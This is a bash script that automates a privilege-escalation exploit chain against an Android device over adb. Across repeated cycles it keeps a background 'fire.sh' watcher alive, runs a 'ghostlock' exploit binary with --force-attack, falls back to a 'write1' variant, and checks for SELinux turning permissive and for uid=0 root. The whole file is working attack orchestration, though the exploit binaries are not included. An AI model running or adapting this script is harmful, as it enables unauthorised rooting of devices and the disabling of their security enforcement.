#!/bin/bash
# autoroot v2 - official-first strategy
# stage A: official ghostlock --force-attack (proven 2x success) with patched profile (w1_attempts=60)
# stage B: fne --write1 (W1-only, no teardown) fallback
# every cycle: ensure fire.sh watcher running; stop on root
ADB="/Users/hoyo/WorkBuddy AI/2026-10-28-12-02-20/tools/platform-tools/adb"
a() { "$ADB" "$@"; }
log() { echo "[$(date +%T)] $*"; }
MAXCYC=${1:-12}
R=/Users/hoyo/ghostlock-work

wait_device() {
  for n in $(seq 1 40); do
    a get-state >/dev/null 2>&1 && return 0
    sleep 8
  done
  return 1
}

root_ok() {
  a shell 'su -c id 2>/dev/null' 2>/dev/null | grep -q "uid=0"
}

ensure_fire() {
  pid=$(a shell 'cat /data/local/tmp/.fire.pid 2>/dev/null' 2>/dev/null | tr -d '\r\n')
  if [ -n "$pid" ] && a shell "kill -0 $pid 2>/dev/null" >/dev/null 2>&1; then
    log "fire watcher alive pid=$pid"
  else
    a shell 'rm -f /data/local/tmp/.fired /data/local/tmp/.fire.pid; nohup sh /data/local/tmp/fire.sh >/dev/null 2>&1 & sleep 1; echo newpid=$(cat /data/local/tmp/.fire.pid 2>/dev/null)'
    log "fire watcher restarted"
  fi
}

for cycle in $(seq 1 "$MAXCYC"); do
  log "=== cycle $cycle/$MAXCYC ==="
  if ! wait_device; then log "no device; abort"; exit 1; fi
  sleep 20
  UPT=$(a shell 'cut -d. -f1 /proc/uptime' 2>/dev/null | tr -d '\r\n')
  E=$(a shell 'cat /sys/fs/selinux/enforce 2>/dev/null' | tr -d '\r\n')
  log "boot uptime=${UPT}s enforce=$E"
  ensure_fire

  if root_ok; then log "=== ROOT OK (boot had root) ==="; exit 0; fi

  # boot already permissive: watcher will chain; wait a bit
  if [ "$E" = "0" ]; then
    log "permissive at boot; waiting chain"
    for i in $(seq 1 12); do sleep 5; root_ok && { log "=== ROOT OK (permissive boot) ==="; exit 0; }; done
  fi

  # stage A: official ghostlock (patched profile w1_attempts=60)
  log "-- official --force-attack (cap 240s)"
  a shell 'cd /data/local/tmp && timeout 240 ./ghostlock --load-prebuilt-profile profile.bin --force-attack >gl_a.log 2>&1; echo rc=$?; getenforce' 2>&1 | tail -2
  logA=$(a shell 'strings gl_a.log 2>/dev/null | grep -aE "w1_attempts|route_done|Write 1|SIG_ENFORCE|kernel: " | tail -5' 2>/dev/null | tr '\r\n' ' ')
  log "official-log: $logA"
  sleep 6
  if root_ok; then log "=== ROOT OK after official ==="; exit 0; fi
  if ! a get-state 2>/dev/null | grep -q device; then
    log "device rebooted post-official; next cycle"
    continue
  fi
  E=$(a shell 'cat /sys/fs/selinux/enforce 2>/dev/null' | tr -d '\r\n')
  if [ "$E" = "0" ]; then
    log "permissive post-official; waiting fire chain 40s"
    for i in $(seq 1 24); do sleep 5; root_ok && { log "=== ROOT OK ==="; exit 0; }; done
    log "permissive but no root yet; continuing"
  fi

  # stage B: fne --write1 fallback (only if device still online)
  if a get-state 2>/dev/null | grep -q device; then
    log "-- fne --write1 (cap 420s)"
    a shell 'cd /data/local/tmp && GL_W1_ATTEMPTS=10 timeout 420 ./ghostlock_fne --write1 >w1m.log 2>&1; echo rc=$?; getenforce' 2>&1 | tail -2
    sleep 6
    if root_ok; then log "=== ROOT OK after fne ==="; exit 0; fi
    if a get-state 2>/dev/null | grep -q device; then
      E=$(a shell 'cat /sys/fs/selinux/enforce 2>/dev/null' | tr -d '\r\n')
      if [ "$E" = "0" ]; then
        log "permissive post-fne; waiting fire chain 40s"
        for i in $(seq 1 24); do sleep 5; root_ok && { log "=== ROOT OK ==="; exit 0; }; done
      fi
    else
      log "device rebooted post-fne"
    fi
  fi
done
log "autoroot exhausted $MAXCYC cycles without root"
